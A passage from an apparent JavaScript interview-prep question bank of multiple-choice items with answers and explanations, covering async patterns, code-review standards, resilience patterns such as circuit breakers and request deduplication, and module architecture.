    // Rollback on failure
    setLiked(currentState);
    setLikeCount(prev => currentState ? prev + 1 : prev - 1);
    showError('Failed to update like. Please try again.');
  }
}
```

- A) Optimistic updates are dangerous — always wait for the server response
- B) Optimistic updates immediately reflect the user\'s action in the UI, with rollback on server failure, providing a responsive UX
- C) This pattern causes race conditions in all cases
- D) Optimistic updates only work with WebSocket connections

**Answer: B) Optimistic updates immediately reflect the user\'s action with rollback on server failure**

**Explanation:** Optimistic UI updates assume success and immediately update the UI, making the app feel instant. If the server fails, roll back to the previous state and show an error. This pattern requires: 1) immediate state update; 2) async server request; 3) rollback logic on error. Used by Twitter (likes), GitHub (reactions), and most social platforms for immediate feel without perceived latency.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the best pattern for managing multiple concurrent API calls with error isolation?

```javascript
async function loadDashboard(userId) {
  const [userResult, postsResult, notificationsResult] = await Promise.allSettled([
    fetchUser(userId),
    fetchPosts(userId),
    fetchNotifications(userId)
  ]);
  
  return {
    user: userResult.status === 'fulfilled' ? userResult.value : null,
    posts: postsResult.status === 'fulfilled' ? postsResult.value : [],
    notifications: notificationsResult.status === 'fulfilled' ? notificationsResult.value : [],
    errors: [userResult, postsResult, notificationsResult]
      .filter(r => r.status === 'rejected')
      .map(r => r.reason)
  };
}
```

- A) Using `Promise.all` here would be better — it\'s simpler
- B) `Promise.allSettled` with partial results allows the dashboard to load successfully even if some APIs fail — critical for resilient UIs
- C) All three requests should be made sequentially for reliability
- D) `Promise.race` would be more appropriate here

**Answer: B) `Promise.allSettled` with partial results allows the dashboard to load even if some APIs fail**

**Explanation:** `Promise.all` would fail the entire dashboard if any single API fails. `Promise.allSettled` waits for all and returns success/failure for each. The pattern extracts partial results (showing what loaded) while collecting errors for logging. Dashboards with multiple independent data sources should always use `allSettled` — users see partial data instead of a blank error page.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## L5: Technical Lead

<br>

## # 28. Code Review & Standards

<br>

## Q. During a PR review, a Tech Lead spots the following pattern repeated across the codebase. What is the primary concern and the recommended fix?

```javascript
// In multiple components:
useEffect(() => {
  fetch("/api/data")
    .then(res => res.json())
    .then(data => setData(data));
}, []);
```

- A) `fetch` should be replaced with `axios` — it has better defaults
- B) The effect has no cleanup, causing a state update on an unmounted component (memory leak / React warning)
- C) The empty dependency array means the effect never re-runs, which is always a bug
- D) `res.json()` should be wrapped in a try-catch inside `.then()`

**Answer: B) The effect has no cleanup, causing a state update on an unmounted component (memory leak / React warning)**

**Explanation:** If the component unmounts before the `fetch` resolves, calling `setData` on an unmounted component triggers a React warning and potential memory leak. The fix is to use an `AbortController` or an `isMounted` flag in the cleanup function returned from `useEffect`. A Tech Lead should establish this pattern as a team-wide coding standard.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A Tech Lead reviews a junior developer\'s code. Which anti-pattern makes this function hardest to test and maintain?

```javascript
async function processOrder(orderId) {
  const db = new DatabaseConnection("prod-db://...");
  const logger = new FileLogger("/var/log/app.log");
  const order = await db.findById(orderId);
  logger.log(`Processing order ${orderId}`);
  order.status = "processing";
  await db.save(order);
  await sendEmail(order.userEmail, "Your order is being processed");
  return order;
}
```

- A) Using `async/await` instead of Promises reduces testability
- B) The function hardcodes its dependencies, making it impossible to unit test in isolation (violates Dependency Inversion)
- C) The function does too many `await` calls and should use `Promise.all`
- D) `db.findById` should validate the `orderId` before querying

**Answer: B) The function hardcodes its dependencies, making it impossible to unit test in isolation (violates Dependency Inversion)**

**Explanation:** `DatabaseConnection`, `FileLogger`, and `sendEmail` are all instantiated or called directly inside the function with no way to inject mocks. A Tech Lead should refactor this to accept dependencies via parameters or a DI container: `processOrder(orderId, { db, logger, mailer })`. This makes unit testing trivial by allowing stubs/mocks.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A Tech Lead is reviewing a utility module submitted by a team member. What is the critical bug in this memoization implementation?

```javascript
function memoize(fn) {
  const cache = {};
  return function(...args) {
    const key = args.toString();
    if (key in cache) return cache[key];
    cache[key] = fn(...args);
    return cache[key];
  };
}
```

- A) `args.toString()` is a valid and collision-free cache key strategy
- B) `args.toString()` creates key collisions — e.g., `memoize(f)(1,2)` and `memoize(f)("1,2")` produce the same key
- C) The cache should use `WeakMap` to avoid memory leaks from function arguments
- D) `fn(...args)` should be called inside a `try...catch` block

**Answer: B) `args.toString()` creates key collisions — e.g., `memoize(f)(1,2)` and `memoize(f)("1,2")` produce the same key**

**Explanation:** `[1, 2].toString()` and `["1,2"].toString()` both produce the string `"1,2"`, so two different argument lists map to the same cache key. A robust fix is to use `JSON.stringify(args)` as the key, which distinguishes `[1,2]` (`"[1,2]"`) from `["1,2"]` (`'["1,2"]'`). A Tech Lead catching this in review prevents subtle correctness bugs in production.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A Tech Lead reviews a PR with this error handling pattern. What is the issue?

```javascript
async function getData(id) {
  try {
    const res = await fetch(`/api/data/${id}`);
    const data = await res.json();
    return data;
  } catch (e) {
    console.error(e); // swallows the error!
    return null;
  }
}

// Calling code has no way to know if it failed
const result = await getData(123);
if (result) processData(result);
```

- A) No issue — returning `null` on error is a valid pattern
- B) The error is swallowed — callers receive `null` without knowing why it failed; they can\'t distinguish between "no data" and "request failed"
- C) The `try/catch` should be removed; all errors should be unhandled
- D) `fetch` errors should be caught with `.catch()`, not `try/catch`

**Answer: B) The error is swallowed — callers receive `null` without knowing why it failed**

**Explanation:** Swallowing errors (catch → log → return null) hides failures from callers. Callers can\'t distinguish "ID has no data" from "network failed". Better: rethrow a domain error (`throw new DataFetchError(id, e)`), or return a Result type `{ data, error }`. At minimum, don\'t catch errors you can\'t handle — let them propagate for the caller to decide.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What naming convention issue should a Tech Lead flag in this PR?

```javascript
// Submitted in PR:
const d = new Date();
const ts = d.getTime();
function proc(u) {
  return u.n + ' ' + u.ln;
}
const r = users.map(proc);
```

- A) No issue — abbreviations improve performance by reducing string length
- B) Cryptic abbreviations (`d`, `ts`, `u`, `n`, `ln`, `proc`, `r`) harm readability and maintainability; descriptive names are essential
- C) Only function names should be descriptive; variable names can be abbreviated
- D) Abbreviated names are preferred in JavaScript for minification compatibility

**Answer: B) Cryptic abbreviations harm readability and maintainability**

**Explanation:** Code is read far more than it\'s written. Cryptic abbreviations: `d` → `currentDate`, `ts` → `timestamp`, `u` → `user`, `n` → `firstName`, `ln` → `lastName`, `proc` → `formatFullName`, `r` → `formattedUsers`. Minifiers handle abbreviation automatically. A Tech Lead should enforce naming standards via ESLint rules (e.g., `id-length`) and style guide.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What should a Tech Lead require regarding code documentation for this utility function?

```javascript
function retry(fn, options) {
  // implementation
}
```

- A) No documentation needed — good code is self-documenting
- B) A JSDoc comment describing parameters (types, optional/required), return value, thrown errors, and a usage example — enabling IDE autocompletion and `@type` inference
- C) Just an inline comment explaining what `fn` is
- D) Full Markdown documentation is required for all functions

**Answer: B) A JSDoc comment describing parameters, return value, thrown errors, and a usage example**

**Explanation:** Public utility functions should have JSDoc: `@param {Function} fn`, `@param {Object} options`, `@param {number} [options.retries=3]`, `@returns {Promise<*>}`, `@throws {Error}`, `@example`. This: enables TypeScript type checking without converting to `.ts`; provides IDE hover docs; is the foundation for auto-generated API documentation; and communicates contract to users.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What test coverage concern should a Tech Lead raise about this function?

```javascript
function divide(a, b) {
  return a / b;
}

// Existing tests:
test('divides 10 by 2', () => expect(divide(10, 2)).toBe(5));
```

- A) Coverage is fine — one test proves the function works
- B) The test covers only the happy path — missing edge cases: `b = 0` (returns `Infinity`), negative numbers, non-numbers, `NaN` inputs
- C) Division functions don\'t need tests
- D) More tests would slow down the CI pipeline

**Answer: B) Missing edge cases: `b = 0`, negative numbers, non-numbers, `NaN` inputs**

**Explanation:** A Tech Lead should require: `divide(0, 0)` → `NaN`; `divide(10, 0)` → `Infinity`; `divide(-10, 2)` → `-5`; `divide('a', 2)` → `NaN`; `divide(null, 2)` → `0`. Code coverage (line/branch coverage) doesn\'t capture these — a function can be 100% line-covered with one test while missing critical edge cases. Semantic coverage matters more than line coverage.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Tech Lead enforce consistent async/await error handling across the team?

- A) Require all async functions to have a `try/catch` block
- B) Establish a layered error handling strategy: service/API calls throw typed errors; UI components catch and display them; unhandled rejections are caught by a global handler with logging
- C) Use `.catch()` on every Promise and never use `try/catch`
- D) Let errors propagate naturally without any strategy

**Answer: B) Establish a layered error handling strategy with typed errors, component-level catches, and a global handler**

**Explanation:** A consistent strategy: 1) **API layer**: throw typed errors (`ApiError`, `NetworkError`) with context. 2) **Business logic**: catch expected errors, handle or rethrow. 3) **UI components**: display user-friendly messages based on error type. 4) **Global handler** (`window.onerror`, `process.on('unhandledRejection')`): catch and log missed errors. Enforced via ESLint (`no-floating-promises`), code review checklist, and shared error utilities.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What performance anti-pattern should a Tech Lead identify in this React code?

```javascript
function UserList({ users }) {
  return users.map(user => (
    <div key={user.id} onClick={() => deleteUser(user.id)}>
      {user.name}
    </div>
  ));
}
```

- A) Using `.map()` for rendering is an anti-pattern
- B) Creating a new arrow function `() => deleteUser(user.id)` on every render passes a new reference to `onClick` each time, preventing effective memoization of child components
- C) `key={user.id}` causes performance issues
- D) No performance issues — arrow functions in JSX are always optimized

**Answer: B) Creating a new arrow function on every render prevents effective memoization**

**Explanation:** Each render creates fresh `() => deleteUser(user.id)` functions. If child components use `React.memo`, they'll always re-render because `onClick` prop changed (new reference). Fixes: use `useCallback` for stable references; or pass `user.id` as a prop and define the handler inside the child. This anti-pattern is especially impactful in large lists.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What should a Tech Lead require for all public API contracts in a shared library?

- A) Only runtime validation is necessary — TypeScript types are optional overhead
- B) TypeScript type definitions (or JSDoc types) for all inputs/outputs, input validation at boundaries, semantic versioning, and a CHANGELOG for breaking changes
- C) Just a README with examples
- D) API contracts are only needed for external packages, not internal shared libraries

**Answer: B) TypeScript types, input validation, semantic versioning, and CHANGELOG**

**Explanation:** Public API contract requirements: 1) **Types** (TypeScript/JSDoc) — compile-time safety for consumers. 2) **Input validation** — guard against unexpected inputs at the boundary. 3) **Semantic versioning** — patch (bug fix), minor (backward-compatible feature), major (breaking change). 4) **CHANGELOG** — what changed and migration path for breaking changes. This discipline prevents "breaking the world" silently in shared code.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the Tech Lead\'s role in establishing a Git branching strategy?

- A) Git branching strategy doesn\'t matter — all code should go directly to main
- B) Define a branching strategy (GitFlow, trunk-based, etc.), PR size limits, review requirements, and CI gate requirements to prevent unreviewed code in production
- C) Only senior developers need to follow the branching strategy
- D) Branching strategy should be chosen by each developer individually

**Answer: B) Define branching strategy, PR size limits, review requirements, and CI gates**

**Explanation:** A Tech Lead defines team norms: **Trunk-based development** (short-lived branches, frequent integration) vs **GitFlow** (release branches, hotfixes). PR standards: max lines changed (~400), required reviewers, passing CI, linked issue. Automated gates: linting, tests, code coverage thresholds, security scans. Good branching strategy reduces merge conflicts, improves review quality, and ensures production stability.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What should a Tech Lead do when a critical security vulnerability is discovered in a dependency?

- A) Ignore it if the vulnerable code path is never triggered
- B) Immediately assess impact (is the vulnerable code reachable?), update the dependency, test thoroughly, deploy a patch release, and communicate to stakeholders
- C) Wait for the next scheduled dependency update sprint
- D) Remove the dependency entirely and rewrite the functionality

**Answer: B) Assess impact, update, test, patch, and communicate**

**Explanation:** Security vulnerability response: 1) **Assess**: check if the vulnerable API/code path is used in your app (use `npm audit`, Snyk, GitHub Dependabot). 2) **Update**: bump the dependency (patch or minor version usually). 3) **Test**: run regression suite — dependency updates can cause API changes. 4) **Deploy**: patch release to production. 5) **Communicate**: notify affected parties, update SECURITY.md. Never delay security patches based on convenience.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 29. Async Strategy & Team Patterns

<br>

## Q. A Tech Lead must decide on a team-wide async data-fetching standard. The team has mixed usage of callbacks, raw Promises, and `async/await`. Which standard maximizes readability and error-handling consistency?

```javascript
// Option A — Callbacks
getData(id, function(err, data) {
  if (err) handleError(err);
  else process(data);
});

// Option B — Promise chains
getData(id).then(process).catch(handleError);

// Option C — async/await with try/catch
try {
  const data = await getData(id);
  process(data);
} catch (err) {
  handleError(err);
}
```

- A) Option A — callbacks give the most control over execution order
- B) Option B — chains are easier to read than try/catch blocks
- C) Option C — `async/await` reads like synchronous code and provides structured error handling with `try/catch`
- D) All three are equivalent; the choice has no impact on team consistency

**Answer: C) Option C — `async/await` reads like synchronous code and provides structured error handling with `try/catch`**

**Explanation:** `async/await` is the modern standard for async code in JavaScript teams. It avoids callback hell, is more readable than chained `.then()`, and integrates naturally with `try/catch` for error handling. A Tech Lead enforcing `async/await` as a team convention reduces cognitive overhead and makes code reviews more predictable.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A Tech Lead reviews a service that makes 5 independent API calls sequentially. What refactoring produces the biggest performance gain?

```javascript
// Current code
async function loadDashboard(userId) {
  const profile  = await fetchProfile(userId);
  const orders   = await fetchOrders(userId);
  const messages = await fetchMessages(userId);
  const settings = await fetchSettings(userId);
  const stats    = await fetchStats(userId);
  return { profile, orders, messages, settings, stats };
}
```

- A) Replace `async/await` with raw Promises for lower overhead
- B) Use `Promise.all` to run all five independent requests concurrently
- C) Use `Promise.race` to return the fastest result and skip the rest
- D) Add `setTimeout(0)` between calls to yield to the event loop

**Answer: B) Use `Promise.all` to run all five independent requests concurrently**

**Explanation:** The current code awaits each call sequentially — if each takes 200ms, the total is ~1000ms. Since the calls are independent, `Promise.all([fetchProfile, fetchOrders, fetchMessages, fetchSettings, fetchStats])` runs them concurrently, reducing total time to ~200ms (the slowest individual call). This is one of the most impactful async patterns a Tech Lead should enforce for data-loading functions.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the right pattern for handling WebSocket reconnection?

```javascript
class WebSocketManager {
  #ws = null;
  #reconnectDelay = 1000;
  #maxDelay = 30000;
  
  connect(url) {
    this.#ws = new WebSocket(url);
    this.#ws.onclose = () => {
      setTimeout(() => {
        this.#reconnectDelay = Math.min(this.#reconnectDelay * 2, this.#maxDelay);
        this.connect(url);
      }, this.#reconnectDelay);
    };
  }
}
```

- A) The recursive `connect` call will cause a stack overflow
- B) This implements exponential backoff reconnection — retrying with increasing delays up to 30s, avoiding server hammering during outages
- C) WebSockets reconnect automatically — this is unnecessary
- D) `setTimeout` in `onclose` causes memory leaks

**Answer: B) Exponential backoff reconnection — increasing delays up to 30s**

**Explanation:** WebSockets don\'t auto-reconnect. Exponential backoff: 1s → 2s → 4s → 8s → ... → 30s (capped). This prevents overwhelming a recovering server with reconnection storms. The `setTimeout` callback holds a reference to the class instance via closure — no stack overflow since it\'s not recursive via the call stack, it\'s via the event loop. In production, also reset delay on successful reconnection.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the appropriate pattern for request deduplication?

```javascript
const pendingRequests = new Map();

function deduplicatedFetch(url) {
  if (pendingRequests.has(url)) {
    return pendingRequests.get(url); // return existing Promise
  }
  const promise = fetch(url)
    .then(r => r.json())
    .finally(() => pendingRequests.delete(url));
  pendingRequests.set(url, promise);
  return promise;
}
```

- A) This sends duplicate requests — the Map doesn\'t prevent them
- B) Multiple concurrent requests to the same URL share a single in-flight request — prevents N redundant network calls when multiple components request the same data simultaneously
- C) This pattern causes race conditions
- D) The `finally` cleanup causes subsequent requests to always miss the cache

**Answer: B) Multiple concurrent requests share one in-flight request — prevents redundant network calls**

**Explanation:** Without deduplication, if 5 components mount simultaneously and all call `fetchUser(123)`, you get 5 network requests. With deduplication: the first request starts and stores the Promise; subsequent requests return the same Promise. All 5 consumers await the same request. `finally` removes from map when done so future requests get fresh data. This is what SWR and React Query do internally.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Tech Lead design an async job queue to handle background tasks?

```javascript
class AsyncQueue {
  #queue = [];
  #running = 0;
  #concurrency;
  
  constructor(concurrency = 3) {
    this.#concurrency = concurrency;
  }
  
  enqueue(task) {
    return new Promise((resolve, reject) => {
      this.#queue.push({ task, resolve, reject });
      this.#runNext();
    });
  }
  
  async #runNext() {
    if (this.#running >= this.#concurrency || !this.#queue.length) return;
    this.#running++;
    const { task, resolve, reject } = this.#queue.shift();
    try { resolve(await task()); }
    catch(e) { reject(e); }
    finally { this.#running--; this.#runNext(); }
  }
}
```

What does `concurrency = 3` provide?

- A) Sequential processing — only 1 task at a time
- B) A maximum of 3 concurrent async tasks, preventing resource exhaustion while allowing parallelism
- C) The queue processes exactly 3 tasks total and then stops
- D) Tasks are processed in reverse order

**Answer: B) A maximum of 3 concurrent async tasks, preventing resource exhaustion**

**Explanation:** Without concurrency control, flooding a server with 100 simultaneous requests could cause rate limiting or resource exhaustion. The queue runs up to `concurrency` (3) tasks simultaneously. When one completes, the next queued task starts (`#runNext`). This pattern is essential for: bulk API operations, file processing, database migrations, and any scenario where parallelism must be bounded.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the right approach for testing async code in a team setting?

- A) Use `setTimeout` in tests to wait for async operations to complete
- B) Use proper async test utilities: `async/await` in tests, mock timers (`jest.useFakeTimers`), `waitFor` utilities, and test isolation to ensure deterministic async test results
- C) Async code is too unpredictable to test reliably
- D) Use `done` callback with `setTimeout(done, 1000)` in every async test

**Answer: B) Async test utilities: async/await in tests, mock timers, waitFor, and test isolation**

**Explanation:** Async testing best practices: 1) Return Promises or use `async/await` in test functions. 2) `jest.useFakeTimers()` for testing `setTimeout`/`setInterval` without actual delays. 3) `waitFor(() => expect(...))` (Testing Library) for waiting on async UI changes. 4) Mock all external async dependencies. 5) Ensure cleanup in `afterEach` to prevent test pollution. Real timers in tests cause flaky, slow test suites.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is a circuit breaker pattern for async operations?

```javascript
class CircuitBreaker {
  #failures = 0;
  #threshold = 5;
  #open = false;
  #resetTimeout = 60000;
  
  async call(fn) {
    if (this.#open) throw new Error('Circuit breaker is OPEN');
    try {
      const result = await fn();
      this.#failures = 0;
      return result;
    } catch (e) {
      this.#failures++;
      if (this.#failures >= this.#threshold) {
        this.#open = true;
        setTimeout(() => { this.#open = false; this.#failures = 0; }, this.#resetTimeout);
      }
      throw e;
    }
  }
}
```

- A) The circuit breaker retries failed requests automatically
- B) After 5 failures, the circuit opens (blocking calls for 60s) preventing cascade failures and allowing the downstream service to recover
- C) The circuit breaker only works for HTTP requests
- D) Opening the circuit causes all pending requests to succeed

**Answer: B) After 5 failures, the circuit opens — blocking calls and allowing the service to recover**

**Explanation:** Circuit Breaker states: **Closed** (normal) → **Open** (blocking calls after N failures) → **Half-open** (allow test requests after timeout). It prevents cascade failures: if a downstream service is down, fail fast instead of piling up timeouts. After the reset timeout, the circuit closes again for retry. This is critical for resilient microservice architectures.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the correct approach for managing long-polling vs Server-Sent Events vs WebSockets?

- A) WebSockets are always the best choice — they subsume all other approaches
- B) Long-polling for simple infrequent updates; Server-Sent Events for server-to-client streams; WebSockets for bidirectional real-time communication
- C) Long-polling is deprecated and should never be used
- D) Server-Sent Events require WebSockets as a fallback

**Answer: B) Long-polling for simple infrequent updates; SSE for server streams; WebSockets for bidirectional real-time**

**Explanation:** Choose based on needs: **Long-polling** (client repeatedly polls) — simple, works everywhere, good for infrequent updates (email checks). **SSE** (`EventSource`) — efficient server-to-client streaming, HTTP/2 multiplexable, auto-reconnects, limited to text, unidirectional. **WebSockets** — bidirectional, low-latency, binary support, more complex (custom reconnect, protocols). Use the simplest tool that meets the requirements.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the saga pattern for managing complex async workflows?

- A) The saga pattern is a React state management library
- B) A saga coordinates a series of async operations where each step can fail independently, with compensating actions (rollbacks) for partial failures
- C) The saga pattern prevents all async failures
- D) Sagas are only applicable in the backend with event sourcing

**Answer: B) A saga coordinates async steps with compensating rollbacks for partial failures**

**Explanation:** A saga manages long-running distributed transactions. Example: Book flight → Book hotel → Charge card. If charging fails, **compensating transactions** undo prior steps (cancel flight, cancel hotel). In Redux-Saga, generators control async side effects with `take`, `put`, `call`. The pattern prevents partial state by providing explicit rollback logic — critical for e-commerce, booking systems, and financial applications.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Tech Lead approach async state synchronization across multiple tabs?

- A) Async state is inherently tab-local — cross-tab synchronization is impossible without a server
- B) Use the `storage` event (localStorage), `BroadcastChannel` API, or `SharedWorker` for cross-tab communication without a server
- C) All tabs should poll the server every second to stay synchronized
- D) Only the active tab should have state — other tabs should be stateless

**Answer: B) Use `storage` event, `BroadcastChannel`, or `SharedWorker` for cross-tab sync**

**Explanation:** Cross-tab sync options: 1) **`storage` event** — fires in other tabs when `localStorage` changes (simplest, limited to strings). 2) **`BroadcastChannel`** — structured message passing between same-origin contexts, supports objects. 3) **`SharedWorker`** — shared thread across tabs, can maintain centralized state. Use case: logout propagation (security critical), shopping cart sync, collaborative editing state. `BroadcastChannel` is the modern recommended approach.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the right strategy for handling optimistic updates that fail?

- A) Never use optimistic updates — they always cause data inconsistency
- B) On failure: rollback state to before the optimistic update, show a user-friendly error, log the failure for debugging, and potentially offer a retry mechanism
- C) On failure: silently refresh the page to restore consistent state
- D) On failure: keep the optimistic state and reconcile on next page load

**Answer: B) On failure: rollback, show error, log failure, offer retry**

**Explanation:** Optimistic update failure handling: 1) **Rollback** — restore exact previous state (use snapshot before update). 2) **User notification** — toast/banner with clear message and retry option. 3) **Logging** — capture error details for debugging (Sentry, Datadog). 4) **Retry** — allow user to retry with idempotency key to prevent duplicate actions. Silently refreshing on failure destroys user input and is poor UX.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 30. Module Architecture

<br>

## Q. A Tech Lead is reviewing a `utils/index.js` barrel file that re-exports all utilities. A team member reports that the bundle size has grown significantly. What is the likely cause?

```javascript
// utils/index.js
export { formatDate }   from "./date";
export { sortArray }    from "./sort";
export { debounce }     from "./debounce";
export { deepClone }    from "./deepClone";
export { parseCSV }     from "./csv";       // includes Papa Parse (500KB)
export { renderChart }  from "./chart";     // includes D3 (200KB)
```

- A) Barrel files are always larger than direct imports — avoid them entirely
- B) Importing any single utility from `utils/index.js` causes the bundler to include all re-exported modules if tree-shaking fails (e.g., with CommonJS or side-effect-heavy modules)
- C) The issue is that `export { }` syntax is not tree-shakeable — use `export default` instead
- D) `parseCSV` and `renderChart` should be renamed to prevent bundler confusion

**Answer: B) Importing any single utility from `utils/index.js` causes the bundler to include all re-exported modules if tree-shaking fails (e.g., with CommonJS or side-effect-heavy modules)**

**Explanation:** Barrel files can defeat tree-shaking when modules have side effects or use CommonJS format. The bundler may include the entire barrel. A Tech Lead should audit barrel files, mark pure modules with `"sideEffects": false` in `package.json`, ensure all modules use ES Module syntax, or split large dependencies into separate lazy-loaded entry points.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A Tech Lead is establishing circular dependency detection as part of CI. Which scenario represents a circular dependency that will cause a runtime `undefined` error?

```javascript
// a.js
import { b } from "./b.js";
export const a = () => `a calls ${b()}`;

// b.js
import { a } from "./a.js";
export const b = () => `b calls ${a()}`;
```

- A) This is not a circular dependency — each file imports from a different file
- B) This is a circular dependency; depending on evaluation order, `a` or `b` may be `undefined` at the time of the first call, causing a `TypeError`
- C) ES Modules resolve circular imports automatically without any runtime issues
- D) The code will throw a `SyntaxError` before execution

**Answer: B) This is a circular dependency; depending on evaluation order, `a` or `b` may be `undefined` at the time of the first call, causing a `TypeError`**

**Explanation:** ES Modules handle circular references through "live bindings," but if `a.js` is evaluated first, `b` will be `undefined` when `a` is defined. The fix is to break the cycle by extracting shared logic into a third module, or restructuring dependencies. Tech Leads should configure tools like `eslint-plugin-import` with `no-cycle` to catch this in CI.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the SOLID principle most violated by this module design?

```javascript
// user-service.js — does too many things
export class UserService {
  async getUser(id) { /* fetch from DB */ }
  async sendWelcomeEmail(user) { /* send email */ }
  async logActivity(user, action) { /* write to log */ }
  async updateAnalytics(event) { /* push to analytics */ }
  async chargeSubscription(user) { /* process payment */ }
}
```

- A) Liskov Substitution Principle
- B) Single Responsibility Principle — the class has too many reasons to change (data, email, logging, analytics, payments)
- C) Interface Segregation Principle
- D) Open/Closed Principle

**Answer: B) Single Responsibility Principle — the class has too many reasons to change**

**Explanation:** SRP: a module should have one reason to change. `UserService` changes if: DB schema changes; email provider changes; logging format changes; analytics system changes; payment processor changes. Fix: split into `UserRepository`, `EmailService`, `ActivityLogger`, `AnalyticsService`, `PaymentService`. Each module has a single, clear responsibility and can be tested, replaced, and evolved independently.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the right strategy for managing shared utilities across micro-frontend teams?

- A) Each team should copy-paste shared utilities into their own codebase
- B) Create an internal npm package (or monorepo package) for shared utilities, with semantic versioning, typed exports, and a documented upgrade path
- C) Use a single global variable exposed on `window` to share utilities
- D) Shared utilities should live in one team\'s repo and be imported directly via CDN

**Answer: B) Create an internal npm package with semantic versioning and typed exports**

**Explanation:** Shared utilities across teams require: 1) **Versioned package** (npm/monorepo) — each team pins a version; breaking changes require a major version bump. 2) **TypeScript types** — consumer type safety. 3) **Documented API** — changelog, migration guides. 4) **Tree-shakeable** (ESM). Global variables (`window.utils`) create implicit coupling, version conflicts, and runtime errors. The internal package approach scales to N teams without coordination overhead.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should feature flags be architected for A/B testing at the module level?

```javascript
// Feature flag module
const flags = await fetchFeatureFlags(userId);

export const featureFlags = {
  newCheckout: flags.newCheckout ?? false,
  betaSearch: flags.betaSearch ?? false,
};

// Usage
import { featureFlags } from './feature-flags';
const CheckoutComponent = featureFlags.newCheckout 
  ? NewCheckout 
  : LegacyCheckout;
```

- A) Feature flags should be checked directly via inline `fetch` calls in each component
- B) Feature flags are centralized, fetched once, and exposed as a module — components import flags without knowing the source, enabling easy testing and cleanup
- C) Feature flags should only be implemented server-side
- D) Using a module for feature flags prevents hot-reload from working

**Answer: B) Centralized feature flags module — components import without knowing the source**

**Explanation:** Feature flag architecture: 1) Single source of truth (one fetch, one module). 2) Components import flags declaratively — no direct fetch calls scattered everywhere. 3) Easy to mock in tests (`jest.mock('./feature-flags', () => ({ newCheckout: true }))`). 4) Flags have clear naming and defaults. 5) Dead code elimination — when a flag is permanently enabled, remove the legacy branch. This scales from simple booleans to complex targeting rules.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the benefit of the Domain-Driven Design (DDD) approach to module organization?

- A) DDD organizes code by technical layer: all controllers together, all services together, all models together
- B) DDD organizes code by business domain: each domain (users, orders, payments) is self-contained with its own models, services, and UI components
- C) DDD is only applicable to backend codebases
- D) DDD eliminates the need for any shared utilities

**Answer: B) DDD organizes code by business domain — each domain is self-contained**

**Explanation:** Layer-first organization (`/controllers`, `/services`, `/models`) requires changes to span multiple directories. Domain-first (`/users`, `/orders`, `/payments`) keeps related code co-located. Each domain exports a public API (facade pattern), hides internals, and can be owned by a team. This maps to micro-frontend boundaries and enables independent deployment. Tech Leads use DDD to reduce coupling and improve team autonomy.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What should a module\'s public API vs internal structure look like?

```javascript
// ❌ Leaking internals
export { UserModel } from './models/user';
export { validateEmail } from './validators/email';
export { hashPassword } from './crypto/bcrypt';
export { sendEmail } from './mailer/smtp';

// ✅ Clean public API (barrel with intentional exports)
export { createUser, updateUser, deleteUser } from './user-service';
export type { User, CreateUserInput } from './types';
```

- A) Both approaches are equivalent — expose everything for flexibility
- B) Exposing internals (models, validators, crypto) creates coupling; consumers depend on implementation details that change; a clean public API with use-case-oriented functions hides internals
- C) Internal functions should also be exported for testing
- D) `export type` is TypeScript-only and should be avoided for compatibility

**Answer: B) Exposing internals creates coupling; a clean public API hides implementation details**

**Explanation:** Leaking internals means consumers couple to `UserModel`, `hashPassword`, etc. If you switch from bcrypt to argon2, all consumers break. Clean API: export only what consumers need (use cases, not mechanisms). For testing internals, use testing-specific exports or test through the public API. Follow the principle of least privilege — expose the minimum needed.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the dependency injection pattern and why does it improve module testability?

```javascript
// Without DI — hard to test
class OrderService {
  constructor() {
    this.db = new PostgresDatabase(); // hard dependency
    this.emailer = new SendGridEmailer(); // hard dependency
  }
}

// With DI — injectable dependencies
class OrderService {
  constructor(db, emailer) {
    this.db = db;
    this.emailer = emailer;
  }
}
// In tests:
const mockDb = { findOrder: jest.fn() };
const mockEmailer = { send: jest.fn() };
